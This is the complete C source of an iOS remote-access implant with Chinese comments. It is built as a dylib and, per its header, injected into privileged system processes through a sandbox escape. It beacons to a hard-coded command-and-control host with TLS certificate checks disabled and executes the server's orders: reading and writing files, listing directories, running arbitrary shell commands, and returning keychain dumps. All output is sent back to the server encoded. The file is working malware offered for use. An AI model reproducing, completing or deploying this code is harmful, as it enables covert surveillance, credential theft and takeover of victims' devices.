/*
 * nb_daemon_http.c — powerd/SpringBoard 侧特权执行端（HTTP 版）
 *
 * 与 v1 的 nb_daemon.c 保持完全相同的命令协议（每行一条）：
 *   PING                          -> OK|pong
 *   READ_FILE|<path>              -> OK|<base64 data> | ERROR|<msg>
 *   LIST_DIR|<path>               -> OK|<entry1\nentry2...>
 *   WRITE_FILE|<path>|<base64>    -> OK|<bytes> | ERROR|<msg>
 *   STAT|<path>                   -> OK|<size>|<mode>|<uid> | ERROR|<msg>
 *   EXEC|<cmd>                    -> OK|<exit_code>|<stdout base64>
 *   KEYCHAIN|<domain>             -> OK|<base64 data> | ERROR|<msg>
 *
 * 传输改造（参考 v4/C10 Agent）：
 *   - 不再轮询 /tmp/nb_cmd | /tmp/nb_result
 *   - POST https://C2_HOST/beacon  { uuid, device_info, status:"idle" }
 *       响应: { "type":"exec", "command_id":<id>, "params":{"command":"READ_FILE|/p"} }
 *             或 { "type":"noop" }
 *   - 结果 POST https://C2_HOST/result { command_id, uuid, filename, data(base64) }
 *
 * 编译:
 *   xcrun -sdk iphoneos clang -arch arm64e -shared -o nb_daemon_http.dylib nb_daemon_http.c \
 *       -framework Foundation -framework CoreFoundation -framework CFNetwork
 *   ldid -S nb_daemon_http.dylib
 *
 * 加载: 由 Stage3 的 sandboxEscape.Ad() 注入（与 bootstrap.dylib 相同机制）
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <dispatch/dispatch.h>

#include <CoreFoundation/CoreFoundation.h>
#include <CFNetwork/CFNetwork.h>

#define C2_HOST_DEFAULT "c2.aeon-mart.top"
#define C2_PORT          443
#define BEACON_PATH      "/beacon"
#define RESULT_PATH      "/result"
#define INTERVAL_DEFAULT 15
#define MAX_BUF          (512 * 1024)
#define UUID_FILE        "/tmp/nb_agent_uuid"

static char g_uuid[64];
static char g_cmd[MAX_BUF];
static char g_out[MAX_BUF];

/* ─────────────── base64 ─────────────── */
static const char b64t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int b64_encode(const unsigned char *src, int len, char *dst) {
    int i, j = 0;
    for (i = 0; i + 2 < len; i += 3) {
        unsigned int v = (src[i] << 16) | (src[i + 1] << 8) | src[i + 2];
        dst[j++] = b64t[(v >> 18) & 63];
        dst[j++] = b64t[(v >> 12) & 63];
        dst[j++] = b64t[(v >> 6) & 63];
        dst[j++] = b64t[v & 63];
    }
    if (i < len) {
        unsigned int v = src[i] << 16;
        int rem = len - i;
        if (rem == 2) v |= src[i + 1] << 8;
        dst[j++] = b64t[(v >> 18) & 63];
        dst[j++] = b64t[(v >> 12) & 63];
        dst[j++] = (rem == 2) ? b64t[(v >> 6) & 63] : '=';
        dst[j++] = '=';
    }
    dst[j] = 0;
    return j;
}

static int b64val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *src, unsigned char *dst, int max) {
    int i = 0, j = 0;
    while (src[i] && j < max) {
        int a = b64val(src[i++]); if (a < 0) break;
        int b = b64val(src[i++]); if (b < 0) break;
        int c = (src[i] == '=') ? -2 : b64val(src[i]); i++;
        int d = (src[i] == '=') ? -2 : b64val(src[i]); i++;
        dst[j++] = (unsigned char)((a << 2) | (b >> 4));
        if (c >= 0 && j < max) dst[j++] = (unsigned char)(((b & 15) << 4) | (c >> 2));
        if (d >= 0 && j < max) dst[j++] = (unsigned char)(((c & 3) << 6) | d);
    }
    return j;
}

/* ─────────────── HTTP(S) via CFStream ─────────────── */
static CFReadStreamRef g_rs = NULL;
static CFWriteStreamRef g_ws = NULL;

static int c2_open(const char *host) {
    CFStringRef h = CFStringCreateWithCString(NULL, host, kCFStringEncodingUTF8);
    CFHostRef cfhost = CFHostCreateWithName(NULL, h);
    CFStreamCreatePairWithSocketToCFHost(NULL, cfhost, C2_PORT, &g_rs, &g_ws);
    CFRelease(cfhost);
    CFRelease(h);
    if (!g_rs || !g_ws) return -1;

    /* TLS，关闭证书链校验（与 C10 Agent 一致） */
    const void *keys[]   = { kCFStreamSSLValidatesCertificateChain };
    const void *vals[]   = { kCFBooleanFalse };
    CFDictionaryRef ssl = CFDictionaryCreate(NULL, keys, vals, 1,
                                             &kCFTypeDictionaryKeyCallBacks,
                                             &kCFTypeDictionaryValueCallBacks);
    CFWriteStreamSetProperty(g_ws, kCFStreamPropertySSLSettings, ssl);
    CFReadStreamSetProperty(g_rs, kCFStreamPropertySSLSettings, ssl);
    CFRelease(ssl);

    if (!CFWriteStreamOpen(g_ws) || !CFReadStreamOpen(g_rs)) return -2;
    return 0;
}

static void c2_close(void) {
    if (g_ws) { CFWriteStreamClose(g_ws); CFRelease(g_ws); g_ws = NULL; }
    if (g_rs) { CFReadStreamClose(g_rs); CFRelease(g_rs); g_rs = NULL; }
}

static int c2_post(const char *path, const char *json, char *resp, int respMax) {
    char req[MAX_BUF];
    int n = snprintf(req, sizeof(req),
        "POST %s HTTP/1.0\r\nHost: %s\r\nContent-Type: application/json\r\n"
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)\r\n"
        "Content-Length: %zu\r\n\r\n%s", path, C2_HOST_DEFAULT, strlen(json), json);
    if (n <= 0 || n >= (int)sizeof(req)) return -1;
    if (c2_open(C2_HOST_DEFAULT) != 0) return -2;
    CFIndex wrote = CFWriteStreamWrite(g_ws, (const UInt8 *)req, n);
    if (wrote != n) { c2_close(); return -3; }

    int total = 0, hdr_done = 0;
    char *body = resp;
    while (total < respMax - 1) {
        UInt8 tmp[4096];
        CFIndex r = CFReadStreamRead(g_rs, tmp, sizeof(tmp));
        if (r <= 0) break;
        for (CFIndex i = 0; i < r && total < respMax - 1; i++) {
            char c = (char)tmp[i];
            if (!hdr_done) {
                static char tail[5] = {0};
                memmove(tail, tail + 1, 4);
                tail[4] = c;
                if (memcmp(tail, "\r\n\r\n", 4) == 0) { hdr_done = 1; }
                continue;
            }
            body[total++] = c;
        }
        if (hdr_done && total > 0) break; /* 单次 POST，响应一般一次读完 */
    }
    body[total] = 0;
    c2_close();
    return total;
}

/* ─────────────── 极简 JSON 取值 ─────────────── */
static int json_str(const char *s, const char *key, char *out, int max) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(s, pat);
    if (!p) return 0;
    p = strchr(p + strlen(pat), ':');
    if (!p) return 0;
    while (*p && (*p == ':' || *p == ' ')) p++;
    if (*p != '"') return 0;
    p++;
    int i = 0;
    while (*p && *p != '"' && i < max - 1) out[i++] = *p++;
    out[i] = 0;
    return 1;
}

static long json_int(const char *s, const char *key) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(s, pat);
    if (!p) return -1;
    p = strchr(p + strlen(pat), ':');
    if (!p) return -1;
    return strtol(p + 1, NULL, 10);
}

/* ─────────────── 协议执行（与原 nb_daemon 完全一致） ─────────────── */
static void exec_read_file(char *arg) {
    int fd = open(arg, O_RDONLY);
    if (fd < 0) { snprintf(g_out, sizeof(g_out), "ERROR|open errno=%d", errno); return; }
    unsigned char *raw = malloc(MAX_BUF / 2);
    int total = 0, n;
    while (raw && total < MAX_BUF / 2 - 1 &&
           (n = (int)read(fd, raw + total, MAX_BUF / 2 - 1 - total)) > 0) total += n;
    close(fd);
    if (!raw) { snprintf(g_out, sizeof(g_out), "ERROR|oom"); return; }
    char *b = malloc(total * 2 + 16);
    b64_encode(raw, total, b);
    snprintf(g_out, sizeof(g_out), "OK|%s", b);
    free(b); free(raw);
}

static void exec_list_dir(char *arg) {
    DIR *d = opendir(arg);
    if (!d) { snprintf(g_out, sizeof(g_out), "ERROR|opendir errno=%d", errno); return; }
    int off = snprintf(g_out, sizeof(g_out), "OK|");
    struct dirent *e;
    while ((e = readdir(d))) {
        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
        off += snprintf(g_out + off, sizeof(g_out) - off, "%s\n", e->d_name);
        if (off > (int)sizeof(g_out) - 300) break;
    }
    closedir(d);
}

static void exec_write_file(char *arg) {
    char *sep = strchr(arg, '|');
    if (!sep) { snprintf(g_out, sizeof(g_out), "ERROR|usage"); return; }
    *sep = 0;
    const char *b64 = sep + 1;
    unsigned char *raw = malloc(MAX_BUF / 2);
    int len = raw ? b64_decode(b64, raw, MAX_BUF / 2) : 0;
    if (!raw) { snprintf(g_out, sizeof(g_out), "ERROR|oom"); return; }
    int fd = open(arg, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { snprintf(g_out, sizeof(g_out), "ERROR|open errno=%d", errno); free(raw); return; }
    ssize_t w = write(fd, raw, len);
    close(fd); free(raw);
    snprintf(g_out, sizeof(g_out), "OK|%ld", (long)w);
}

static void exec_stat(char *arg) {
    struct stat st;
    if (stat(arg, &st) != 0) { snprintf(g_out, sizeof(g_out), "ERROR|stat errno=%d", errno); return; }
    snprintf(g_out, sizeof(g_out), "OK|%lld|%o|%d", (long long)st.st_size, st.st_mode, st.st_uid);
}

static void exec_exec(char *arg) {
    FILE *fp = popen(arg, "r");
    if (!fp) { snprintf(g_out, sizeof(g_out), "ERROR|popen errno=%d", errno); return; }
    unsigned char *raw = malloc(MAX_BUF / 2);
    size_t total = raw ? fread(raw, 1, MAX_BUF / 2 - 1, fp) : 0;
    int rc = pclose(fp);
    if (!raw) { snprintf(g_out, sizeof(g_out), "ERROR|oom"); return; }
    char *b = malloc(total * 2 + 16);
    b64_encode(raw, (int)total, b);
    snprintf(g_out, sizeof(g_out), "OK|%d|%s", WEXITSTATUS(rc), b);
    free(b); free(raw);
}

static void exec_keychain(char *arg) {
    /* 兼容原实现：若存在 keychain dump 标记则返回其内容，否则报未实现 */
    const char *done = "/tmp/keychain_c2_dump.done";
    if (access(done, F_OK) == 0) {
        int fd = open(done, O_RDONLY);
        if (fd >= 0) {
            unsigned char *raw = malloc(MAX_BUF / 2);
            int total = raw ? (int)read(fd, raw, MAX_BUF / 2 - 1) : 0;
            close(fd);
            char *b = malloc((total > 0 ? total : 1) * 2 + 16);
            b64_encode(raw, total > 0 ? total : 0, b);
            snprintf(g_out, sizeof(g_out), "OK|%s", b);
            free(b); free(raw);
            return;
        }
    }
    snprintf(g_out, sizeof(g_out), "ERROR|keychain not available (domain=%s)", arg ? arg : "");
}

static void run_protocol(const char *line) {
    char buf[MAX_BUF];
    snprintf(buf, sizeof(buf), "%s", line);
    char *bar = strchr(buf, '|');
    if (!bar) {
        if (!strcasecmp(buf, "PING")) snprintf(g_out, sizeof(g_out), "OK|pong");
        else snprintf(g_out, sizeof(g_out), "ERROR|unknown cmd");
        return;
    }
    *bar = 0;
    char *arg = bar + 1;
    if (!strcasecmp(buf, "READ_FILE"))      exec_read_file(arg);
    else if (!strcasecmp(buf, "LIST_DIR"))  exec_list_dir(arg);
    else if (!strcasecmp(buf, "WRITE_FILE"))exec_write_file(arg);
    else if (!strcasecmp(buf, "STAT"))      exec_stat(arg);
    else if (!strcasecmp(buf, "EXEC"))      exec_exec(arg);
    else if (!strcasecmp(buf, "KEYCHAIN"))  exec_keychain(arg);
    else snprintf(g_out, sizeof(g_out), "ERROR|unknown cmd");
}

/* ─────────────── uuid ─────────────── */
static void load_uuid(void) {
    int fd = open(UUID_FILE, O_RDONLY);
    if (fd >= 0) {
        int n = (int)read(fd, g_uuid, sizeof(g_uuid) - 1);
        close(fd);
        if (n > 0) { g_uuid[n] = 0; return; }
    }
    CFUUIDRef u = CFUUIDCreate(NULL);
    CFStringRef s = CFUUIDCreateString(NULL, u);
    CFStringGetCString(s, g_uuid, sizeof(g_uuid), kCFStringEncodingUTF8);
    CFRelease(s); CFRelease(u);
    fd = open(UUID_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) { write(fd, g_uuid, strlen(g_uuid)); close(fd); }
}

/* ─────────────── 主循环 ─────────────── */
static void agent_loop(void) {
    load_uuid();
    char resp[MAX_BUF];
    char cmd[512] = {0};
    long cid = -1;
    int interval = INTERVAL_DEFAULT;

    for (;;) {
        char body[512];
        snprintf(body, sizeof(body),
                 "{\"uuid\":\"%s\",\"device_info\":{\"model\":\"iOS\",\"pid\":%d,\"uid\":%d},\"status\":\"idle\"}",
                 g_uuid, (int)getpid(), (int)getuid());
        memset(resp, 0, sizeof(resp));
        int rn = c2_post(BEACON_PATH, body, resp, sizeof(resp) - 1);
        if (rn > 0) {
            char type[32] = {0};
            json_str(resp, "type", type, sizeof(type));
            if (!strcasecmp(type, "exec")) {
                cid = json_int(resp, "command_id");
                if (!json_str(resp, "command", cmd, sizeof(cmd))) cmd[0] = 0;
                if (cmd[0]) {
                    run_protocol(cmd);
                    char *payload = g_out;
                    if (!strncmp(g_out, "OK|", 3)) payload = g_out + 3;
                    char *rb = malloc(strlen(payload) * 2 + 1024);
                    char *eb = malloc(strlen(payload) * 2 + 16);
                    if (rb && eb) {
                        b64_encode((unsigned char *)payload, (int)strlen(payload), eb);
                        snprintf(rb, strlen(payload) * 2 + 1024,
                                 "{\"command_id\":%ld,\"uuid\":\"%s\",\"filename\":\"r.b64\","
                                 "\"status\":\"completed\",\"data\":\"%s\"}", cid, g_uuid, eb);
                        char rresp[256];
                        c2_post(RESULT_PATH, rb, rresp, sizeof(rresp));
                    }
                    free(rb); free(eb);
                }
            } else if (!strcasecmp(type, "sleep")) {
                long iv = json_int(resp, "interval");
                if (iv >= 1 && iv <= 3600) interval = (int)iv;
            }
        }
        sleep(interval);
    }
}

/* entry0 (type 0x08) 替身：bootstrap 通过 LC_SYMTAB 定位并跳转 _process */
__attribute__((visibility("default")))
void _process(void) {
    dispatch_queue_t q = dispatch_queue_create("nb.agent.http", NULL);
    dispatch_async(q, ^{
        agent_loop();
    });
}
